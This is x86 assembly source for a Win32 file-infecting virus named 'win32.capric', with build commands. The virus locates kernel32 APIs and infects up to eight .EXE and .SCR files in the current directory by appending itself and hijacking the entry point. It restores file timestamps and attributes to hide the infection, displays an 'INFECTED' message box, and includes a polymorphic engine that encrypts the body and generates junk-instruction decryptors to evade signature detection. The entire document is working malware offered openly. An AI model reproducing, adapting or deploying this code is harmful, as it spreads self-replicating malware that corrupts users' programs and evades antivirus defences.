; win32.capric, with poly engine.
; compile with: tasm32 /ml gv.asm,,;
;               tlink32 /x /Tpe /c gv.obj,gv.exe,,import32.lib
; and set code-section writeable:
;               editbin /SECTION:CODE,rwe gv.exe
; / capsyl
.586p
.model flat, stdcall

extrn MessageBoxA:PROC
extrn ExitProcess:PROC

.code
exit1stgen:	; ofGHG! 
	call	MessageBoxA,0,offset msgm,offset msgt,0
	call	ExitProcess,0
msgt	db	" - virii",0
msgm	db	" - 1st GENERATiON iS DONE. - ",0

.data

start:
	virsz		equ	(vend-vstart)
	tmpsz		equ	1024	
	
; virusc0de here
vstart:
	call	delta
delta:	pop	ebp
	sub	ebp,	offset delta

; get baseaddr of kernel32.dll
getKrnlBase:
	mov	ebx,		[esp]
	and	ebx,		0ffff0000h
	mov	ecx,		50h
getk32:	cmp	word ptr [ebx], "ZM"
	jz	short gotk32
	sub	ebx,	10000h
	loop	getk32
	stc
gotk32:	jc	retback
	mov	[ebp+kernelbase], ebx

	; save
	push	dword ptr [ebp+tmpep]
	pop	dword ptr [ebp+oldep]
	push	dword ptr [ebp+tmpib]
	pop	dword ptr [ebp+oldib]

	; get needed Apis
	call	getAPIs

	; find and infect files
	call	findNinf

	; jmp	to hostcode
	or	ebp,	ebp
	jz	exit1stgen

retback:
	; PAYLOAD
	lea	esi,	[ebp+msgm_A]
	mov	edx,	esi
	mov	edi,	esi
	mov	ecx,	msgm_Asz
	xor	ebx,	ebx
msgl:
	lodsb
	cmp	al,	41h
	jb	msgn
	cmp	al,	5ah
	ja	msgn
	or	ebx,	ebx
	jz	msgn_
	add	al,	20h	
	xor	ebx,	ebx
	jmp	msgn
msgn_:	inc	ebx
msgn:
	stosb
	loop	msgl

	lea	ebx,	[ebp+msgt_A]	
	call	[ebp+aMessageBoxA],0,edx,ebx,0

	mov	eax,	[ebp+oldep]
	add	eax,	[ebp+oldib]
	jmp	eax	; jump to hosts real entrypoint	

; -----------------

; findNinf routine, finds file(s), then jumps to preinf
; and opens & maps it, then checkfile and at last infectFile 
findNinf:
	; open "." and infect it 
	lea	edi,	[ebp+currdir]
	call	[ebp+aGetCurrentDirectoryA],7Fh,edi
	call	infectDir

	; get other dirs...

	ret

; infectDir - find files specified by mask in current dir
;
infectDir:
	mov	byte ptr [ebp+infcounter], ninfections 
	lea	eax,	[ebp+exemask]
	call	findFile

	mov	byte ptr [ebp+infcounter], ninfections
	lea	eax,	[ebp+scrmask]
	call	findFile

	;mov	byte ptr [ebp+infcounter], ninfections
	;lea	eax,	[ebp+rarmask]
	;call	findFile

	ret

; find one file, (get search handle)
findFile:
	lea	ebx,	[ebp+searchData]
	call	[ebp+aFindFirstFileA],eax,ebx
	; save search-handle
	mov	[ebp+searchHndl], eax
	jmp	preinf

; find more files
findFiles:
	; clear out old filename
	xor	eax,	eax
	lea	edi,	[ebp+searchData.wfd_FileName]
	mov	ecx,	260
	rep	stosb
	; find more files
	lea	eax,	[ebp+searchData]
	call	[ebp+aFindNextFileA],[ebp+searchHndl],eax	
	or	eax,	eax
	jz	CloseSearchHndl          ; no more, close handle

; "prepare" found file, open, map
preinf:
	cmp	byte ptr [ebp+infcounter], 0 
	jz	CloseSearchHndl

	lea	esi,	[ebp+searchData.wfd_FileName]
	; set fileattributes to "any file"
	call	[ebp+aSetFileAttributesA],esi,80h

	; open file, existing rw 
	call	[ebp+aCreateFileA],esi,0C0000000h,0,0,3,0,0

	inc	eax
	jz	findFiles		
	dec	eax
	mov	[ebp+fileHndl],	eax

; first map to only check the header 
	mov	ecx,	040h
	call	mapit

	; filecheck here ...

checkPEfile:
	; check if MZ-sign
	cmp	word ptr [eax],	'ZM'
	jnz	demapfile	
	mov	esi,	[eax+3Ch]	
	add	esi,	eax
	; check PE-sign
	cmp	dword ptr [esi], 'EP'
	jnz	demapfile	
	; check if already infected
	cmp	byte ptr [esi+3Bh],	'X'
	jz		demapfile	

	; oh, a nice file (or is it?), infect it
	; first close the maphandle
	call	[ebp+aUnmapViewOfFile],[ebp+mapAddr]
	call	[ebp+aCloseHandle],[ebp+mapHndl]

	; now map the file + extra
	mov	ecx,	[ebp+searchData.wfd_FileSizeLow]
	add	ecx,	virsz+1000h
	call	mapit

	;jmp	infectPEfile

	; infection here
	
infectPEfile:
	mov	esi,	[eax+3Ch]
	add	esi,	eax
	mov	edi,	esi
	; get addr of last section
	mov	ebx,	[esi+74h]         ; dir-entries
	shl	ebx,	3                 ; * 8 (size)
	movzx	eax,	word ptr [esi+6]  ; sections
	dec	eax                       ; last one
	mov	ecx,	28h               ; * (size)
	mul	ecx                       ; .
	add	esi,	78h               ; dir-table
	add	esi,	ebx               ; add them
	add	esi,	eax               ; and addr in esi

	; addr of last section in esi
	; start of pe-hdr in edi	

	; set section RWE 
	or	dword ptr [esi+24h],	0A0000020h	

	; save old entrypoint and imagebase
	mov	eax,         [edi+28h]
	mov	[ebp+tmpep], eax	
	mov	eax,         [edi+34h]
	mov	[ebp+tmpib], eax

	; calculate new entrypoint 
	mov	eax,	[esi+0Ch]      ; VirtualAddress
	add	eax,	[esi+10h]      ; SizeOfRawData 
	mov	[ebp+newep],	eax    ; save virus-entrypoint
	mov	[edi+28h],	eax    ;
	
	; get where to write virus 
	mov	ebx,	[esi+10h]      ; SizeOfRawData
	add	ebx,	[esi+14h]      ; PointerToRawData
	push	ebx                    ; offset in file of where to write vir
	push	eax                    ; EP
	; align the new size to add
	xor	edx,	edx            ;
	mov	eax,	[esi+10h]      ; SizeOfRawData
	add	eax,	virsz+tmpsz    ; add with sizeof vir
	push	eax                    ;
	mov	ecx,	[edi+3Ch]      ; alignment
	div	ecx                    ; eax / ecx, remanining in edx
	pop	eax                    ;
	sub	ecx,	edx            ;	
	add	eax,	ecx            ; aligned size in eax
	; set new size of section, file  
	mov	[esi+10h],	eax    ; SizeOfRawData
	mov	[esi+08h],	eax    ; VirtualSize
	add	eax,	[esi+0Ch]      ; VirtualAddress	
	mov	[edi+50h],	eax    ; SizeOfImage

	; get random vaule for en/de-cryption, and save
	call	[ebp+aGetTickCount]
	mov	[ebp+seed],	eax

	; now call poly to write decryptor and code to host
	
	mov	byte ptr [edi+3Bh],'X' ; infection mark

	; Now call p0ly
	; ESI = start of code
	; EDI = where to place in file
	; EBX = location of viruscode in host
	; ECX = size of code in dword 
	lea	esi,	[ebp+vstart]   ;
	pop	ebx                    ; EP
	add	ebx,	[ebp+tmpib]    ; normalize
	pop	edi                    ; offset in file
	add	edi,	[ebp+mapAddr]  ; normalize
	mov	ecx,	virsz/4        ; ..
	pushad
	call	p0ly
	popad

	jmp	unmapfile

; mapping routine, ecx holds how much to map
mapit:
	push	ecx
	call	[ebp+aCreateFileMappingA],[ebp+fileHndl],0,4,0,ecx,0
	or	eax,	eax
	jz	closefile	
	mov	[ebp+mapHndl],	eax
	
	pop	ecx	; how much to map 

	; mappy, (eax = map-handle)	
	call	[ebp+aMapViewOfFile],eax,2,0,0,ecx
	mov	[ebp+mapAddr],	eax
	ret

; to get it right with no-good files
demapfile:
	mov	ecx,	[ebp+searchData.wfd_FileSizeLow]
	call	[ebp+aSetFilePointer],[ebp+fileHndl],ecx,0,0
	call	[ebp+aSetEndOfFile],[ebp+fileHndl]

; unmap and close file
unmapfile:	call	[ebp+aUnmapViewOfFile],[ebp+mapAddr]
closemap:	call	[ebp+aCloseHandle],[ebp+mapHndl]
closefile:	call	[ebp+aCloseHandle],[ebp+fileHndl]	

; set back the original fileattributes
setdefattrib:	
	lea	eax,	[ebp+searchData.wfd_CreationTime]
	lea	ebx,	[ebp+searchData.wfd_LastAccessTime]
	lea	ecx,	[ebp+searchData.wfd_LastWriteTime]
	call	[ebp+aSetFileTime],[ebp+fileHndl],eax,ebx,ecx

	lea	eax, [ebp+searchData.wfd_FileName]
	call	[ebp+aSetFileAttributesA],eax, \
			[ebp+searchData.wfd_FileAttributes]

	; find more files
	jmp	findFiles

CloseSearchHndl:
	call	[ebp+aFindClose], [ebp+searchHndl]
findDone:
	ret

; get all needed apis
; ebx = kernelbase
; ebp = delta offset 
getAPIs:
	; search kernel importtbl for GetProcaddr
	; and save the address.
	call	gGetProcAddr

	; get apis from kernel32.dll
	mov	ebx,	[ebp+kernelbase]
	lea	esi,	[ebp+k32APIs]
	lea	edi,	[ebp+k32APIa]
	call	gAPIs	

	; get apis from user32.dll 	
	lea	eax,	dword ptr [ebp+user32dll]
	push	eax
	call	dword ptr [ebp+aLoadLibraryA]
	mov	ebx,	eax
	lea	esi,	[ebp+u32APIs]
	lea	edi,	[ebp+u32APIa]
	call	gAPIs	

	ret

gGetProcAddr:
	push	ebx
	pop	edx	; kernelbase in edx
	add	edx,	[edx+3ch]
	add	edx,	78h
	mov	edx,	[edx]		
	add	edx,	ebx         ; export table	 
	mov	esi,	[edx+20h]   ; Address of Names (RVA)
	add	esi,	ebx         ; ptrs in esi
	xor	ecx,	ecx         ; counter
_gGetProcAddr:
	inc	ecx        	; inc counter
	lodsd
	add	eax,	ebx	; heya!
	cmp	[eax],	'PteG'
	jnz	_gGetProcAddr
	cmp	[eax+4],'Acor'
	jnz	_gGetProcAddr
	cmp	[eax+8],'erdd'
	jnz	_gGetProcAddr

	; got it.
	; addr = couter*2, (in ordinals), then result times 4 (in addr)
	mov	edi,	ebx	; kb in edi
	mov	ebx,	[edx+24h]
	add	ebx,	edi
	movzx	ecx,	word ptr [ebx+2*ecx]; counter*2 +addr of ordinals
	sub	ecx,	[edx+10h]
	mov	ebx,	[edx+1Ch]
	add	ebx,	edi		; VA
	mov	edx,	[ebx+4*ecx]	; oye
	add	edx,	edi
	mov	dword ptr [ebp+aGetProcAddr], edx

	ret

; Gets apis from dlls usings GetProcAddr
; ebx = kernelbase
; esi = ptr to apiname
; edi = place to store apiaddr
; ebp = delta offset
gAPIs:
	push	esi
	push	ebx
	call	dword ptr [ebp+aGetProcAddr]	
	test	eax,	eax
	jz	gexit	
	stosd
g1:	; get next api
	inc	esi
	cmp	byte ptr [esi], 0
	jnz	g1
	inc	esi
	cmp	byte ptr [esi], 0FFh ; end of 'em 
	jnz	gAPIs
gexit:
	ret

; DATA -------------------------------------------------------- 

filetime                  STRUC      ; filetime structure
   ft_dwLowDateTime            dd ?    
   ft_dwHighDateTime           dd ?   
filetime                  ENDS  ;

win32_find_data	          STRUC 
   wfd_FileAttributes          dd ?   
   wfd_CreationTime            filetime ?   
   wfd_LastAccessTime          filetime ?  
   wfd_LastWriteTime           filetime ? 
   wfd_FileSizeHigh            dd ?      
   wfd_FileSizeLow             dd ?      
   wfd_Reserved0               dd ?         
   wfd_Reserved1               dd ?         
   wfd_FileName                dd 260 dup(?)
   wfd_AlternateFileName       dd 13 dup(?)
       	                       dd  3 dup(?)      ;	padding 
win32_find_data           ENDS        

	searchData	win32_find_data	?
	searchHndl	dd	0
	exemask		db	"*.EXE",0
	scrmask		db	"*.SCR",0
	;rarmask		db	"*.RAR",0
	currdir		db	7Fh dup (0)
	ninfections	equ	8	
	infcounter	db	ninfections 

	fileattr	dd	0
	fileHndl	dd	0
	mapHndl		dd	0
	mapAddr		dd	0
	
	kernelbase	dd	0
	user32dll	db	'USER32.DLL',0

	newep		dd	0
	oldep		dd	01000h	
	tmpep		dd	0
	oldib		dd	0
	tmpib		dd	0

;  the info-msg
	msgt_A 		db	"infO",0 
	msgm_A 		db	"ABCDEF____INFECTED___ABCDEF",0dh,0ah
			db	"ABCDEF______SHIT_____ABCDEF",0
	msgm_Asz	equ	$-msgm_A

; APIs . 
	sGetProcAddr            db 'GetProcAddr',0
	aGetProcAddr            dd 0
k32APIs:
	sLoadLibraryA           db 'LoadLibraryA',0
	sExitProcess            db 'ExitProcess',0
	sCreateFileA            db 'CreateFileA',0
	sCloseHandle            db 'CloseHandle',0
	sFindFirstFileA         db 'FindFirstFileA',0
	sFindNextFileA          db 'FindNextFileA',0
	sFindClose              db 'FindClose',0
	sSetFilePointer         db 'SetFilePointer',0
	sSetEndOfFile           db 'SetEndOfFile',0
	sSetFileAttributesA     db 'SetFileAttributesA',0
	sSetFileTime            db 'SetFileTime',0
	sGetCurrentDirectoryA   db 'GetCurrentDirectoryA',0
	sCreateFileMappingA     db 'CreateFileMappingA',0
	sMapViewOfFile          db 'MapViewOfFile',0
	sUnmapViewOfFile        db 'UnmapViewOfFile',0
	sGetTickCount           db 'GetTickCount',0
	                        db 0FFh
u32APIs:
	sMessageBoxA            db 'MessageBoxA',0
	                        db 0FFh
k32APIa:
	aLoadLibraryA           dd	0
	aExitProcess            dd	0
	aCreateFileA            dd	0
	aCloseHandle            dd	0
	aFindFirstFileA         dd	0
	aFindNextFileA          dd	0
	aFindClose              dd	0
	aSetFilePointer         dd	0
	aSetEndOfFile           dd	0
	aSetFileAttributesA     dd	0
	aSetFileTime            dd	0
	aGetCurrentDirectoryA   dd	0
	aCreateFileMappingA     dd	0
	aMapViewOfFile          dd	0
	aUnmapViewOfFile        dd	0
	aGetTickCount           dd	0

u32APIa:
	aMessageBoxA            dd	0

; Poly engine
; ebx = where vircode will be on exec
; edi = where to store decryptor
; esi = code to decrypt
; ecx = size of code (dword)
; ebp = delta offset
p0ly:;------------------------------------
	mov	[ebp+CodeAddr],	esi
	mov	[ebp+StartAddr],edi
	mov	[ebp+StartOfCode], ebx
	mov	[ebp+CryptLen],  ecx

	call	random32
	mov	[ebp+CryptKey],	eax

	call	random32
	mov	[ebp+IncKey],	eax

	mov	eax,	2
	call	brandom32
	mov	[ebp+decrdir],	al

;-----------------------------------------
; -----------  Get registers  ------------
getregs:
	call	getAreg
	mov	[ebp+preg],	al
	call	getAreg
	mov	[ebp+lreg],	al
	call	getAreg
	mov	[ebp+kreg],	al

	mov	[ebp+_t1], 0
	mov	[ebp+_t2], 0
	mov	[ebp+_t3], 0
	mov	[ebp+_t4], 0

;-----------------------------------------
; Generate the code here
generate_poly:
	call	garbage
	call	garbage

	call	swapregs

	call	beforeLoop
	call	garbage
	call	beforeLoop
	call	garbage
	call	beforeLoop

	call	garbage
	call	swapregs
	mov	[ebp+loopaddr],	edi
	call	garbage

	call	insideloop
	call	garbage
	call	insideloop
	call	garbage
	call	insideloop
	call	garbage
	call	insideloop
	call	garbage
	call	afterloop

	call	swapregs

	call	garbage
	call	garbage

	mov	ecx,	edi
	sub	ecx,	[ebp+StartAddr]
	mov	eax,	[ebp+ptrplace]
	add	[eax+1],ecx

;
;-----------------------------------------

; Encrypt and write viruscode 

	mov	esi,	[ebp+CodeAddr]	
	mov	ebx,	[ebp+CryptKey]
	mov	ecx,	[ebp+CryptLen]
	mov	edx,	[ebp+IncKey]
e__:	lodsd
	xor	eax,	ebx
	add	ebx,	edx
	stosd
	loop	e__

	ret

;-----------------------------------------;
;-----------------------------------------;

;-----------------------------------------
; -----------  Before Loop  --------------
;	(1)	mov	preg,StartOfCode
;	(2)	mov	lreg,lengthOfCode
;	(3)	mov	kreg,key
beforeLoop:
	mov	eax,	3
	call	brandom32

	or	eax,	eax
	jz	bl1
	dec	eax
	jz	bl2
	jmp	bl3

;	(1)	mov	preg,	StartOfCode
bl1:	cmp	[ebp+_t1], 1
	jz	beforeLoop
	mov	[ebp+_t1], 1

	mov	[ebp+ptrplace],	edi

	mov	eax,	2
	call	brandom32
	or	eax,	eax
	jnz	bl1_2
bl1_1:
	; push start, pop preg
	mov	al,	68h
	stosb
	mov	eax,	[ebp+StartOfCode]
	stosd
	call	garbage
	mov	al,	58h
	add	al,	[ebp+preg]
	stosb
	ret	
bl1_2:
	; mov	preg,	startOfIt	
	mov	al,	0b8h
	add	al,	[ebp+preg]
	stosb
	mov	eax,	[ebp+StartOfCode]
	stosd
	ret

;	(2)	mov	lreg,	lengthOfCode
bl2:	cmp	[ebp+_t2], 1
	jz	beforeLoop
	mov	[ebp+_t2], 1

	mov	eax,	2
	call	brandom32
	or	eax,	eax
	jnz	bl2_2
bl2_1:
	; push	CryptLen, pop lreg
	mov	al,	68h
	stosb
	mov	eax,	[ebp+CryptLen]
	stosd
	call	garbage
	mov	al,	58h
	add	al,	[ebp+lreg]
	stosb
	ret
bl2_2:
	; mov	lreg,	CryptLen
	mov	al,	0b8h
	add	al,	[ebp+lreg]
	stosb
	mov	eax,	[ebp+CryptLen]
	stosd
	ret

;	(3)	mov	kreg,	key
bl3:	cmp	[ebp+_t3], 1
	jz	beforeLoop
	mov	[ebp+_t3], 1
	
	mov	eax,	2
	call	brandom32
	or	eax,	eax
	jnz	bl3_2
bl3_1:
	; push	CryptKey, pop kreg
	mov	al,	68h
	stosb
	mov	eax,	[ebp+CryptKey]
	stosd
	call	garbage
	mov	al,	58h
	add	al,	[ebp+kreg]
	stosb
	ret
bl3_2:
	; mov	kreg,	CryptKey
	mov	al,	0b8h
	add	al,	[ebp+kreg]
	stosb
	mov	eax,	[ebp+CryptKey]
	stosd
	ret

;-----------------------------------------
; -----------  Inside Loop  --------------
;	(1)	add	preg,	4
;	(2)	dec	lreg
;	(3)	xor	[preg],	kreg
;	(4)	add	kreg,	IncKey
insideloop:
	; put (3) first
	jmp	il3
insideloop2:
	
	mov	eax,	3
	call	brandom32

	or	eax,	eax
	jz	il1
	dec	eax
	jz	il2
	jmp	il4

;	(1)	add	preg,	4
il1:
	cmp	[ebp+_t1], 0
	jz	insideloop
	mov	[ebp+_t1], 0

	;cmp	[ebp+decrdir],	1
	;jz	il1
il1_1:
	mov	ax,	0c083h
	or	ah,	[ebp+preg]
	stosw
	mov	al,	4
	stosb
	ret
il1_2:
	mov	ax,	0e883h
	or	ah,	[ebp+preg]
	stosw
	mov	al,	4
	stosb
	ret

;	(2)	dec	lreg
il2:
	cmp	[ebp+_t2], 0
	jz	insideloop
	mov	[ebp+_t2], 0

	mov	eax,	2
	call	brandom32
	or	eax,	eax
	jnz	il2_2
il2_1:
	; dec	lreg
	mov	al,	48h
	add	al,	[ebp+lreg]
	stosb
	ret
il2_2:
	; sub	lreg, 1
	mov	ax,	0e883h
	or	ah,	[ebp+lreg]
	stosw
	mov	al,	1	
	stosb
	ret

;	(3)	xor	[preg],	kreg
il3:
	cmp	[ebp+_t3], 0
	jz	insideloop2
	mov	[ebp+_t3], 0
	
il3_1:	mov	al,	31h
	mov	ah,	[ebp+preg]
	mov	dl,	[ebp+kreg]
	shl	dl,	3
	or	ah,	dl
	stosw
	ret

;	(1)	add	kreg,	IncKey	
il4:
	cmp	[ebp+_t4], 1 
	jz	insideloop
	mov	[ebp+_t4], 1
	
	mov	ax,	0c081h
	or	ah,	[ebp+kreg]
	stosw
	mov	eax,	[ebp+IncKey]
	stosd
	ret
	
;-----------------------------------------
; -----------  After Loop  ---------------
;	(1)	cmp	lreg,	0
;	(2)	jnz	loopy
afterloop:

;	(1)	cmp	lreg,	0
al1:
	mov	eax,	3	
	call	brandom32

	or	al,	al
	jz	al1_1
	dec	al
	jz	al1_2
	jmp	al1_3
al1_1:
	mov	ax,	0f883h	; cmp
	or	ah,	[ebp+lreg]
	stosw
	xor	eax,	eax
	stosb
	jmp	al2

al1_2:	mov	al,	0bh	; or
	jmp	al1_23
al1_3:	mov	al,	85h	; test
al1_23:	mov	ah,	[ebp+lreg]
	shl	ah,	3
	add	ah,	[ebp+lreg]
	add	ah,	0c0h
	stosw

;	(2)	jnz	loopy
al2:
	mov	ax,	850fh
	stosw
	mov	eax,	[ebp+loopaddr]
	sub	eax,	edi
	sub	eax,	4
	stosd
	ret

;-----------------------------------------
; ---------  Get a register  -------------
getAreg:
	mov	eax,	8
	call	brandom32

	cmp	al,	4
	jz	getAreg
	cmp	al,	5
	jz	getAreg
	cmp	al,	[ebp+preg]
	jz	getAreg
	cmp	al,	[ebp+lreg]
	jz	getAreg
	cmp	al,	[ebp+kreg]
	jz	getAreg
	cmp	al,	[ebp+treg]
	jz	getAreg
	ret

getUsedreg:
	mov	eax,	3
	call	brandom32
	mov	edx,	eax
	lea	eax,	[ebp+usedRegs]
	mov	al,	byte ptr [eax+edx]
	ret

;-----------------------------------------
; ---------  Swap registers  -------------
g_swapregs:
swapregs:
	cmp	[ebp+inswap],1
	jz	exit_swap	
	mov	[ebp+inswap],1

	call	getUsedreg
	mov	cl,	al

	call	getAreg
	mov	bl,	al

	lea	eax,	[ebp+usedRegs]
	mov	byte ptr [eax+edx],	bl

	mov	al,	3
	call	brandom32

	or	al,	al
	jz	sr1
	dec	al
	jz	sr2
	jmp	sr3

;	push	reg1,reg2 ; pop	reg1,reg2
sr1:
	mov	al,	50h
	add	al,	cl
	stosb

	push	ebx ecx
	call	gen_garb	
	pop	ecx ebx
	
	mov	al,	50h
	add	al,	bl
	stosb

	push	ebx ecx
	call	gen_garb	
	pop	ecx ebx
	
	mov	al,	58h
	add	al,	cl	
	stosb

	push	ebx ecx
	call	gen_garb	
	pop	ecx ebx

	mov	al,	58h
	add	al,	bl
	stosb

	jmp	g_swapregs_exit

;	mov treg,reg1 ; mov reg1,reg2 ; mov reg2,treg	
sr2:
	call	getAreg
	cmp	al,	bl
	jz	sr2	
	mov	[ebp+treg],al

	mov	al,	8bh
	mov	ah,	[ebp+treg]	
	shl	ah,	3	
	or	ah,	0c0h
	or	ah,	bl	
	stosw

	push	ebx ecx
	call	garbage
	pop	ecx ebx

	mov	al,	8bh
	mov	ah,	bl
	shl	ah,	3
	or	ah,	0c0h
	or	ah,	cl
	stosw

	push	ebx ecx
	call	garbage
	pop	ecx ebx

	mov	al,	8bh
	mov	ah,	cl
	shl	ah,	3
	or	ah,	0c0h
	or	ah,	[ebp+treg]
	stosw

	mov	[ebp+treg],43
	jmp	g_swapregs_exit
	
;	xchg	reg1,	reg2
sr3:
	mov	ax,	0c087h
	or	ah,	cl
	shl	bl,	3
	or	ah,	bl
	stosw

g_swapregs_exit:
	mov	[ebp+inswap],0
exit_swap:
	ret

garbage:;---------------------------------;
	mov	ecx,	5	
garbage_:
	push	ecx
	call	gen_garb
	pop	ecx
	loop	garbage_

	ret

gen_garb:
	call	getAreg
	mov	bl,	al

	mov	eax,	garbFsz
	call	brandom32
	
	lea	edx,	[ebp+garbF]
	mov	edx,	[edx+eax*4]
	add	edx,	ebp
	call	edx

	;call	g_mov_r32_imm32

	ret

;-----------------------------------------;

garbF:
	dd	offset (gen_1b)
	dd	offset (g_mov_r32_r32)
	dd	offset (g_mov_r32_imm32)
	dd	offset (g_mov_r8_r8)
	dd	offset (g_mov_r8_imm8)
	dd	offset (g_a_r32_r32)
	dd	offset (g_a_r32_imm32)
	dd	offset (g_zero_r32)
	dd	offset (g_none)
	dd	offset (g_inc_r32)
	dd	offset (g_dec_r32)
	dd	offset (g_none)
	dd	offset (g_push_r32_pop_r32)
	dd	offset (g_push_imm32_pop_r32)
	dd	offset (g_xchg_r32_r32)
	dd	offset (g_newcall)
	;dd	offset (g_oldcall)
	;dd	offset (g_swapregs)
garbFsz	equ	(($-offset garbF)/4)

g_none:
	ret

gen_1b:
	call	gen_1b_
	nop
	clc
	cwde
	stc
	cld
gen_1b_:pop	esi
	mov	eax,	5
	call	brandom32
	add	esi,	eax	
	movsb
	ret

g_mov_r32_r32:
	mov	eax,	8
	call	brandom32
	mov	cl,	al

	cmp	bl,	cl
	jz	g_mov_r32_r32

	mov	ax,	0c08bh
	or	ah,	cl
	shl	bl,	3
	or	ah,	bl
	stosw
	ret

g_mov_r32_imm32:
	mov	al,	bl
	add	al,	0b8h
	stosb
	
	mov	eax,	11111111111111b
	call	brandom32
	stosd
	ret

g_mov_r8_r8:
	call	getAreg
	cmp	al,	4
	ja	g_mov_r8_r8_exit
	mov	bl,	al

	call	getAreg
	cmp	al,	4
	ja	g_mov_r8_r8_exit
	mov	cl,	al
		
	cmp	bl,	cl
	jz	g_mov_r8_r8

	mov	ax,	0c08ah
	or	ah,	cl
	shl	bl,	3
	or	ah,	bl
	stosw
g_mov_r8_r8_exit:
	ret	
	
g_mov_r8_imm8:
	call	getAreg
	cmp	al,	4
	ja	g_mov_r8_imm8_exit

	add	al,	0b0h
	stosb
	call	random32
	stosb
g_mov_r8_imm8_exit:
	ret
	
g_a_r32_r32:
	call	getAreg
	or	al,	al
	jz	g_a_r32_r32
	mov	bl,	al

	call	random32
	and	al,	00111000b
	or	al,	3
	mov	ah,	0c0h
	or	ah,	cl
	shl	bl,	3
	or	ah,	bl
	stosw

	ret

g_a_r32_imm32:
	call	getAreg
	or	al,	al
	jz	g_a_r32_imm32
	mov	bl,	al
	
	call	random32
	and	al,	00111000b
	or	al,	0c0h
	or	al,	bl
	mov	ah,	81h
	xchg	al,	ah
	stosw
	call	random32
	stosd
	ret
	
g_zero_r32:
	mov	eax,	zero_r32sz
	call	brandom32

	lea	edx,	[ebp+zero_r32]
	mov	edx,	[edx+eax*4]
	add	edx,	ebp
	jmp	edx
	
zero_r32:
		dd	offset (gz_xor_r32_r32)
		dd	offset (gz_mov_r32_0)
		dd	offset (gz_sub_r32_r32)
zero_r32sz	equ	(($-offset zero_r32)/4)

gz_xor_r32_r32:
	mov	ax,	0c033h
	or	ah,	bl
	shl	bl,	3
	or	ah,	bl
	stosw

	ret

gz_mov_r32_0:
	mov	al,	bl
	add	al,	0b8h
	stosb

	xor	eax,	eax
	stosd

	ret

gz_sub_r32_r32:
	mov	ax,	0c02bh
	or	ah,	bl
	shl	bl,	3
	or	ah,	bl
	stosw

	ret

g_inc_r32:
	call	getAreg
	add	al,	40h
	stosb
	
	ret

g_dec_r32:
	call	getAreg
	add	al,	48h
	stosb

	ret

g_push_r32_pop_r32:
	mov	eax,	8
	call	brandom32
	add	al,	50h
	stosb
	
	call	gen_garb	

	call	getAreg	
	add	al,	58h
	stosb
	
	ret

g_push_imm32_pop_r32:
	mov	al,	68h
	stosb
	call	random32
	stosd
	
	call	gen_garb	

	call	getAreg
	add	al,	58h
	stosb
	
	ret

g_xchg_r32_r32:
	call	getAreg
	mov	cl,	al
	cmp	bl,	cl
	jz	g_xchg_r32_r32

	mov	ax,	0c087h
	or	ah,	cl
	shl	bl,	3
	or	ah,	bl
	stosw

	ret

g_newcall:
	cmp	[ebp+incall],1
	jz	exit_newcall
	mov	[ebp+incall],1

	cmp	[ebp+ncalls],3
	jae	exit_newcall
	
	;	call	00000000h
	mov	al,	0e8h
	stosb
	xor	eax,	eax
	stosd

	push	edi
	call	garbage
	call	garbage
	;	jmp	00000000h
	mov	al,	0e9h
	stosb
	xor	eax,	eax
	stosd
	
	push	edi
	call	garbage
	call	garbage
	;	ret
	mov	al,	0c3h
	stosb

	mov	ebx,	edi
	pop	ecx
	sub	ebx,	ecx
	mov	[ecx-4],ebx

	pop	edx
	mov	[ebp+scall1],ecx
	
	sub	ecx,	edx
	mov	[edx-4],ecx

	mov	[ebp+incall],0
	inc	byte ptr [ebp+ncalls]
exit_newcall:

	ret

g_oldcall:
	cmp	[ebp+incall],1
	jz	exit_oldcall
	cmp	[ebp+ncalls],4
	jz	exit_oldcall
	
	mov	al,	0e8h
	stosb
	mov	eax,	[ebp+scall1]
	or	eax,	eax
	jz	exit_oldcall
	sub	eax,	edi
	stosd

	inc byte ptr [ebp+ncalls]

exit_oldcall:

	ret

;-----------------------------------------
;------------  PoLY dAtA  ----------------

	StartOfCode	dd	0	
	StartAddr	dd	0	
	ptrplace	dd	0
	CodeAddr	dd	0
	CryptLen	dd	0	
	CryptKey	dd	12345678h	
	IncKey		dd	2244h
	loopaddr	dd	0

	decrdir		db	0	; direction, 0=fw, 1=bw
	
	_t1	db	0
	_t2	db	0
	_t3	db	0
	_t4	db	0	

	inswap	db	0
	ncalls	db	0
	incall	db	0
	scall1	dd	0
	scall2	dd	0
	
usedRegs:
	preg	db	40	; pointer
	lreg	db	41	; length
	kreg	db	42	; key
	treg	db	43	; temp


	rEAX	equ     00000000b
	rECX	equ     00000001b
	rEDX	equ     00000010b
	rEBX	equ     00000011b
	rESP	equ     00000100b
	rEBP	equ     00000101b
	rESI	equ     00000110b
	rEDI	equ     00000111b

;-----------------------------------------;
;-----------------------------------------;

; - random functions from Lord Julus, greets :)
random32:
	push	ecx
	xor	ecx,	ecx
	mov	eax,	[ebp+seed]
	mov	cx,	33
rloop:	add	eax,	eax
	jnc	$+4
	xor	al,	197
	loop	rloop
	mov	[ebp+seed], eax
	pop	ecx
	ret
seed	dd	0bff81234h	
brandom32:
	push	edx ecx
	xor	edx,	edx
	push	eax
	call	random32
	pop	ecx
	div	ecx
	xchg	eax,	edx
	pop	ecx edx
	ret

	nop
	nop
	nop
	nop
vend: ; the end of virus

end start






